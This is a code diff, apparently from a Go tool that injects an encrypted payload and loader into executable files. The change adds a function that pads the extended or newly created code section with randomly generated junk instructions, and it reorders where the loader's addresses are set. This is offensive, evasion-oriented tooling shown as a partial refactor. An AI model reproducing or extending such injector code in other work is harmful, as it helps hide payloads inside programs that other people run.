@@ -882,7 +882,7 @@ func (inj *Injector) useExtendTextMode(ctx *loaderCtx, loader string, payload []
 	payloadOffset := randomBeginSize + inj.loaderSize + randomEndSize
 	size := payloadOffset + uint32(len(payload)) // #nosec G115
 	// extend text and update internal status
-	output, err := inj.extendTextSection(size)
+	output, extended, err := inj.extendTextSection(size)
 	if err != nil {
 		return "", err
 	}
@@ -891,14 +891,12 @@ func (inj *Injector) useExtendTextMode(ctx *loaderCtx, loader string, payload []
 		return "", err
 	}
 	text := inj.img.Sections[0]
-	inj.loaderRVA = text.VirtualAddress + randomBeginSize
-	inj.loaderFOA = text.Offset + randomBeginSize
-
-	// padding the garbage instruction to the extended text
-
+	inj.paddingGarbageInst(text.Offset, extended)
 	// write encrypted payload
 	copy(inj.dup[text.Offset+payloadOffset:], payload)
 	// update context
+	inj.loaderRVA = text.VirtualAddress + randomBeginSize
+	inj.loaderFOA = text.Offset + randomBeginSize
 	ctx.PayloadRVA = text.VirtualAddress + payloadOffset
 	ctx.ExtendTextMode = true
 	inj.ctx.Mode = ModeExtendText
@@ -921,7 +919,7 @@ func (inj *Injector) useExtendTextNSMode(ctx *loaderCtx, loader string, payload 
 	randomEndSize := uint32(reservedCtxJunkInst + inj.rand.Intn(256))  // #nosec G115
 	size := randomBeginSize + inj.loaderSize + randomEndSize
 	// extend text and update internal status
-	output, err := inj.extendTextSection(size)
+	output, extended, err := inj.extendTextSection(size)
 	if err != nil {
 		return "", err
 	}
@@ -929,9 +927,6 @@ func (inj *Injector) useExtendTextNSMode(ctx *loaderCtx, loader string, payload 
 	if err != nil {
 		return "", err
 	}
-	text := inj.img.Sections[0]
-	inj.loaderRVA = text.VirtualAddress + randomBeginSize
-	inj.loaderFOA = text.Offset + randomBeginSize
 	// create section for write payload
 	payload = inj.encryptPayload(ctx, payload)
 	size = uint32(len(payload)) // #nosec G115
@@ -939,9 +934,13 @@ func (inj *Injector) useExtendTextNSMode(ctx *loaderCtx, loader string, payload 
 	if err != nil {
 		return "", err
 	}
+	text := inj.img.Sections[0]
+	inj.paddingGarbageInst(text.Offset, extended)
 	// write encrypted payload
 	copy(inj.dup[section.Offset:], payload)
 	// update context
+	inj.loaderRVA = text.VirtualAddress + randomBeginSize
+	inj.loaderFOA = text.Offset + randomBeginSize
 	ctx.PayloadRVA = section.VirtualAddress
 	ctx.ExtendTextNSMode = true
 	inj.ctx.Mode = ModeExtendTextNS
@@ -966,11 +965,12 @@ func (inj *Injector) useCreateTextMode(ctx *loaderCtx, loader string, payload []
 	if err != nil {
 		return "", err
 	}
-	inj.loaderRVA = section.VirtualAddress + randomBeginSize
-	inj.loaderFOA = section.Offset + randomBeginSize
+	inj.paddingGarbageInst(section.Offset, section.Size)
 	// write encrypted payload
 	copy(inj.dup[section.Offset+payloadOffset:], payload)
 	// update context
+	inj.loaderRVA = section.VirtualAddress + randomBeginSize
+	inj.loaderFOA = section.Offset + randomBeginSize
 	ctx.PayloadRVA = section.VirtualAddress + payloadOffset
 	ctx.CreateTextMode = true
 	inj.ctx.Mode = ModeCreateText
@@ -1036,6 +1036,23 @@ func (inj *Injector) insertGarbageInst() string {
 		return ""
 	}
 	return ";" + toDB(inj.garbageInst())
+}
+
+// padding the garbage instruction to the extended text
+// section or created new text section code cave.
+func (inj *Injector) paddingGarbageInst(foa, size uint32) {
+	rem := size
+	for {
+		inst := inj.garbageInstForce()
+		l := uint32(len(inst))
+		if rem >= l {
+			copy(inj.dup[foa:], inst)
+			foa += l
+			rem -= l
+			continue
+		}
+		break
+	}
 }
 
 func removeCodeCaveModeStub(loader string) string {
